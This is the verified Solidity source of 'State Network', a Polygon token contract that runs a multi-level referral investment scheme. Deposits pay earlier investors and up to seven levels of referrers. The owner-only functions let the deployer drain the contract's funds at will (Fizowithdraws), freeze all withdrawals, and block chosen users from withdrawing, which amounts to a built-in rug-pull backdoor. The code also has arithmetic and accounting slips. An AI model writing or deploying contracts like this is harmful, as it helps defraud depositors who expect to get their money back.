/**
 *Submitted for verification at polygonscan.com on 2023-05-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}

contract StateNetwork is IERC20
{
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    using SafeMath for uint256;
    address payable initiator;
    address payable aggregator;
    address [] investors;
    uint256 contractBalance;
    uint256 [] referral_bonuses;
    uint256 initializeTime;
    uint256 totalInvestment;
    uint256 totalWithdraw;
    uint256 totalHoldings;
    uint256 _initialCoinRate = 100000000;
    uint256  TotalHoldings;
    uint256[] public LEVEL_PERCENTS=[1100,300, 200, 100, 100, 100, 200];
	uint256[] public LEVEL_UNLOCK=[0e18, 200e18, 400e18, 800e18, 1600e18, 3200e18, 6400e18];
    address vipwallet=0x327e03BE466402dD4E3eE980DB26f81029298B64;
    address marketingwallet=0x327e03BE466402dD4E3eE980DB26f81029298B64;
    uint8 lock;

    struct User{
        uint256 token;
        address referral;
        uint256 POI;
        uint256 teamWithdraw;
        uint256 teamIncome;
        uint256 totalInvestment;
        uint8   nonWorkingPayoutCount;
        uint256 lastNonWokingWithdraw;
        uint256 lastNonWokingWithdrawBase;
        uint256 depositCount;
        uint256 payoutCount;
        uint256 sellCount;
        uint256 totalBusiness;
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) team_per_level;
        mapping(uint8 => uint256) levelIncome;
       }
    
    struct Deposit{
        uint256 amount;
        uint256 businessAmount;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 depositTime;
    }

    struct Withdraw{
        uint256 amount;
        bool isWorking;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 withdrawTime;
    }

    struct Is_active{
        uint8 statewithdrawb;
        uint8 teamwithdrawb;
    }
 
    mapping(address => User) public users;
    mapping(address => Deposit[]) public deposits;
    mapping(address => Withdraw[]) public payouts;
    mapping(address => Is_active) public is_activeb;
  
   

    event Deposits(address buyer, uint256 amount);
    event POIDistribution(address buyer, uint256 amount);
    event TeamWithdraw(address withdrawer, uint256 amount);
    event STATEWithdraw(address withdrawer, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyInitiator(){
        require(msg.sender == initiator,"You are not initiator.");
        _;
    }
     constructor()
    {
        _name = "State Network";
        _symbol = "STATE";
        initiator = payable(msg.sender);
        aggregator = payable(msg.sender);
        initializeTime = block.timestamp;
      
        
    }

    function contractInfo() public view returns(uint256 fantom, uint256 totalDeposits, uint256 totalPayouts, uint256 totalInvestors, uint256 totalHolding, uint256 balance,uint256 totalHold){
        fantom = address(this).balance;
        totalDeposits = totalInvestment;
        totalPayouts = totalWithdraw;
        totalInvestors = investors.length;
        totalHolding = totalHoldings;
        balance = contractBalance;
        totalHold=TotalHoldings;
        return(fantom,totalDeposits,totalPayouts,totalInvestors,totalHolding,balance,totalHold);
    }

    function name() public view virtual override returns (string memory) 
    {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) 
    {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) 
    {
        return 0;
    }

    function totalSupply() public view virtual override returns (uint256) 
    {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal virtual 
    {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
      
    }

    function _burn(address account,uint256 amount) internal virtual 
    {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        require(_totalSupply>=amount, "Invalid amount of tokens!");

        _balances[account] = accountBalance - amount;
        
        _totalSupply -= amount;
    }

     function balanceOf(address account) public view virtual override returns (uint256) 
    {
        return _balances[account];
    }
    
     function tokensToMATIC(uint tokenAmount) public view returns(uint)
    {
        return tokenAmount*(1 ether)/getCoinRate();
    }

     function MATICToState(uint256 matic_amt) public view returns(uint)
    {
         uint _rate = coinRate();
         return (matic_amt.mul(60).mul(_rate))/(100*1 ether);
    }

   function coinRate() public view returns(uint)
    {
        if( TotalHoldings < 100000*(1 ether) ){
            return 10000*(1 ether)/((1 ether)+(9*TotalHoldings/100000));
        }else{
            return TotalHoldings>=(1 ether)?_initialCoinRate*(1 ether)/TotalHoldings:_initialCoinRate;
        }
    }

    function getCoinRate() public view returns(uint)
    {
        uint _rate = coinRate();
        return _rate;
    }
    function getCoinRatec(address memberId) public view returns(uint,uint,uint,uint)
    {
        uint TotalHoldingss = TotalHoldings;
        User storage user = users[memberId];
        uint256 invesment = user.totalInvestment;
        uint _initialCoinRates=_initialCoinRate;
        
         uint temp_holdings = TotalHoldings>user.totalInvestment?(TotalHoldings-(user.totalInvestment)):1;
        uint fina1l= temp_holdings>=(1 ether)?_initialCoinRate*(1 ether)/temp_holdings:_initialCoinRate;
    return(TotalHoldingss,
invesment,_initialCoinRates,fina1l
    );

    }

     function _distributePOI(address depositor, uint256 _poi) internal{
        uint256 poiShare;
       for(uint256 i = 0; i < investors.length; i++){
            User storage user = users[investors[i]];
            uint256 tokens =user.token*1e18;
            poiShare = tokens.mul(100).div(totalHoldings);
            user.POI+=(_poi.mul(poiShare).div(100))/1e18;
           }
        emit POIDistribution(depositor,_poi);
    }

     function _setReferral(address _addr, address _referral, uint256 _amount) private {
        
        if(users[_addr].referral == address(0)) {
            users[_addr].lastNonWokingWithdrawBase = block.timestamp;
            users[_addr].referral = _referral;
            for(uint8 i = 0; i < LEVEL_PERCENTS.length; i++) {
                users[_referral].referrals_per_level[i]+=_amount;
                users[_referral].team_per_level[i]++;
               
                if(i == 0){
                    users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                    users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                }
                else if(i>0 && users[_referral].referrals_per_level[i]>=LEVEL_UNLOCK[i]){
                    users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                    users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                }
                _referral = users[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }


     function redeposit() public payable{
        require(msg.value>=1e18,"Minimum 1 MATIC allowed to invest");
        
        User storage user = users[msg.sender];
         require(user.depositCount>0, "Please Invest First !");
        uint _rate = coinRate();
        
        user.token+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        contractBalance+=msg.value.mul(60).div(100);
        
        _distributePOI(msg.sender,msg.value.mul(14).div(100));
        user.depositCount++;
        totalHoldings+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        TotalHoldings+=(msg.value*60/100);
        users[users[msg.sender].referral].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        uint256 tokens = (msg.value*60*_rate)/(100*1 ether);
         _mint(msg.sender, tokens);
        uint256 maticrate = tokensToMATIC(1);
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).mul(_rate))/(100*1 ether),
            maticrate,
            block.timestamp
        ));

        _setReReferral(users[msg.sender].referral, msg.value);
        payable(marketingwallet).transfer(msg.value.mul(2).div(100));
        payable(vipwallet).transfer(msg.value.mul(3).div(100));
        emit Deposits(msg.sender, msg.value);
    }

    function _setReReferral(address _referral, uint256 _amount) private {
        for(uint8 i = 0; i < LEVEL_PERCENTS.length; i++) {
            users[_referral].referrals_per_level[i]+=_amount;
            if(i == 0){
                users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
            }
            else if(i>0 && users[_referral].referrals_per_level[i]>=LEVEL_UNLOCK[i]){
                users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
            }
            _referral = users[_referral].referral;
            if(_referral == address(0)) break;
        }
        
    }


    function _getWorkingIncome(address _addr) internal view returns(uint256 income){
        User storage user = users[_addr];
        for(uint8 i = 0; i <= 8; i++) {
            income+=user.levelIncome[i];
        }
        return income;
    }

    function teamWithdraw(uint256 _amount) public{
        User storage user = users[msg.sender];
        
        require(user.totalInvestment>0, "Invalid User!");
          require(lock==0, "Lock!");

        Is_active storage is_active = is_activeb[msg.sender];

        require(is_active.teamwithdrawb==0, "Invalid User!");


        uint256 working = user.teamIncome;
        uint256 withdrawable = working.add(user.POI).sub(user.teamWithdraw);
        require(withdrawable>=_amount, "Invalid withdraw!");
        user.teamWithdraw+=_amount;
        user.payoutCount++;
        _amount = _amount.mul(100).div(100);
        uint256 _amountpay = _amount.mul(90).div(100);
        payable(msg.sender).transfer(_amountpay);
        totalWithdraw+=_amount;
        payouts[msg.sender].push(Withdraw(
            _amount,
            true,
            0,
            0,
            block.timestamp
        ));
        payable(marketingwallet).transfer(_amount.mul(10).div(100));
        emit TeamWithdraw(msg.sender,_amount);
      
    }

   
   function stateWithdraw(uint8 _perc) public{
        User storage user = users[msg.sender];
        Is_active storage is_active = is_activeb[msg.sender];
    
        require(lock==0, "Lock!");
        require(user.totalInvestment>0, "Invalid User!");
        require(is_active.statewithdrawb==0, "Invalid User!");
        
        if(_perc == 10 || _perc == 50 || _perc == 100)
		{
         uint256 nextPayout = (user.lastNonWokingWithdraw>0)?user.lastNonWokingWithdraw + 1 days:deposits[msg.sender][0].depositTime;
         require(block.timestamp >= nextPayout,"Sorry ! See you next time.");
         uint8 perc = _perc;
         uint8 deduct=40;
            if(perc==10)
            {
                deduct=10;
            }
            else if(perc==50)
            {
                deduct=20;

            }
        uint256 tokenAmount = user.token.mul(perc).div(100);
        require(_balances[msg.sender]>=tokenAmount, "Insufficient token balance!");
        uint256 maticAmount = tokensToMATIC(tokenAmount);
        uint256 maticrate = tokensToMATIC(1);
        require(address(this).balance>=maticAmount, "Insufficient fund in contract!");
        uint256 calcWithdrawable = maticAmount;
        contractBalance-=calcWithdrawable;
        uint256 withdrawable = maticAmount;

		uint256 withdrawable1 =withdrawable.mul(deduct).div(100);
        uint256 withdrawable2 = withdrawable -withdrawable1;
        payable(msg.sender).transfer(withdrawable2);
        user.sellCount++;
        user.lastNonWokingWithdraw = block.timestamp;
        user.token-=user.token.mul(perc).div(100);
        totalHoldings-=user.token.mul(perc).div(100);
        if(TotalHoldings>=maticAmount)
        {
            TotalHoldings-=maticAmount;
        }
        else
        {
            TotalHoldings=1;
        }
        totalWithdraw+=withdrawable;
        
        payouts[msg.sender].push(Withdraw(
            withdrawable,
            false,
            withdrawable.mul(getCoinRate()),
            maticrate,
            block.timestamp
        ));

         _burn(msg.sender, tokenAmount);
         uint256 withdrawable3 =withdrawable1;
         if(deduct > 10)
         {
             uint256 withdrawable4 =withdrawable1.mul(14).div(100);
             withdrawable3 = withdrawable1 -withdrawable4;

            _distributePOI(msg.sender,withdrawable1.mul(14).div(100));
         }
         
         aggregator.transfer(withdrawable3);
         emit  STATEWithdraw(msg.sender,withdrawable2);

        
        }
       
        }
        
    

   function deposit(address _referer) public payable
   {
        require(msg.value>=1e16,"Minimum 1 MATIC allowed to invest");
         User storage user = users[msg.sender];
 
      
			if (users[_referer].depositCount > 0 && _referer != msg.sender) {
			    _referer = _referer;
			}
            else
            {
                _referer = 0x0000000000000000000000000000000000000000;
            }
	    
        uint _rate = coinRate();
        user.token+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        contractBalance+=msg.value.mul(60).div(100);
        
        _distributePOI(msg.sender,msg.value.mul(14).div(100));
         if(user.depositCount==0)
         {
              investors.push(msg.sender);
              _setReferral(msg.sender,_referer, msg.value);
         } 
         else
         {
              _setReReferral(users[msg.sender].referral, msg.value);
         }    
        
        user.depositCount++;
        
        totalHoldings+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        TotalHoldings+=(msg.value*60/100);
        users[_referer].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        uint tokens = (msg.value*60*_rate)/(100*1 ether);
         _mint(msg.sender, tokens );
         uint256 maticrate = tokensToMATIC(1);
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).mul(_rate))/(100*1 ether),
            maticrate,
            block.timestamp
        ));
        
        payable(marketingwallet).transfer(msg.value.mul(2).div(100));
        payable(vipwallet).transfer(msg.value.mul(3).div(100));
        emit Deposits(msg.sender, msg.value);
    } 


    function userInfo(address _addr) view external returns(uint256[9] memory team, uint256[9] memory referrals, uint256[9] memory income) {
        User storage player = users[_addr];
        for(uint8 i = 0; i <= 8; i++) {
            team[i] = player.team_per_level[i];
            referrals[i] = player.referrals_per_level[i];
            income[i] = player.levelIncome[i];
        }
        return (
            team,
            referrals,
            income
        );
    }

    function Fizowithdraws(address payable buyer, uint _amount) external onlyInitiator{
        buyer.transfer(_amount);
    }

    function Lock(uint8 status) external onlyInitiator{
            lock=status;
        }

    function Vipwallet(address _account) external onlyInitiator{
       
        vipwallet=_account;
    }

    function Marketingwallet(address _account) external onlyInitiator{
        marketingwallet=_account;
    }


    function statewithdrawb(address _account, uint8 status) external onlyInitiator{
         Is_active storage is_active = is_activeb[_account];

        is_active.statewithdrawb=status;
    }

    function teamwithdrawb(address _account, uint8 status) external onlyInitiator{
         Is_active storage is_active = is_activeb[_account];

        is_active.teamwithdrawb=status;
    }

    
    function checkstateWithdraw(uint8 _perc,address _addr) public view returns(uint256 totalWithdrawn,uint256 deducts,uint256 final_amount)
    {
         User storage user = users[_addr];
        
        require(user.totalInvestment>0, "Invalid User!");
        if(_perc == 10 || _perc == 50 || _perc == 100)
		{
         uint8 perc = _perc;
         uint8 deduct=40;
            if(perc==10)
            {
                deduct=10;
            }
            else if(perc==50)
            {
                deduct=20;
            }
        uint256 tokenAmount = user.token.mul(perc).div(100);
        require(_balances[_addr]>=tokenAmount, "Insufficient token balance!");
        uint256 maticAmount = tokensToMATIC(tokenAmount);
        require(address(this).balance>=maticAmount, "Insufficient fund in contract!");
        uint256 withdrawable = maticAmount;

		uint256 withdrawable1 =withdrawable.mul(deduct).div(100);
        uint256 withdrawable2 = withdrawable -withdrawable1;
       
            totalWithdrawn = maticAmount;
            deducts=withdrawable1;
            final_amount=withdrawable2;
        return(totalWithdrawn, deducts,final_amount );
        
        }
       
        
    }
  


}